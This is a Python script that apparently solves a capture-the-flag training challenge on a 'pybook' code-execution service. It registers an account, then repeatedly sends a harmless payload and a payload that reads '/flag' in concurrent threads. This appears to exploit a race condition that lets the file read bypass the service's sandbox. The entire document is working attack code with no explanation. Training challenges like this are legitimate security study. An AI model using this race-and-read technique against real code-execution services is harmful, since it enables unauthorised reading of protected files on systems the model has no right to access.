import requests
import threading
import time

base_url = "http://pybook.training.jinblack.it"


def register(username, password, s):
    url = "%s/register" % base_url
    data = {"username":username, "password": password}
    response = s.post(url, data=data)
    return response

def login(username, password, s):
    url = "%s/login" % base_url
    data = {"username": username, "password": password}
    response = s.post(url, data=data)
    return response

headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
}

def run(payload, s):
    url = "%s/run" % base_url
    data = payload
    response = s.post(url, data=data, headers = headers)
    if "flag" in response.text:
        print(response.text)

#username = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
#password = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
username = "aaaa"
password = "bbbb"

payload1 = """
count = 0
while count < 4:
  print("ciao")
  count += 1
"""

payload2 = """
with open('/flag', 'r') as file:
    content = file.read()
    print(content)
"""

s = requests.Session()

register(username, password, s)
login(username, password, s)
#run(payload1, s)

while True:
    t1 = threading.Thread(target=run, args=(payload1, s))
    t2 = threading.Thread(target=run, args=(payload2, s))

    t1.start()
    t2.start()
    
    t1.join()
    t2.join()

    time.sleep(0.1)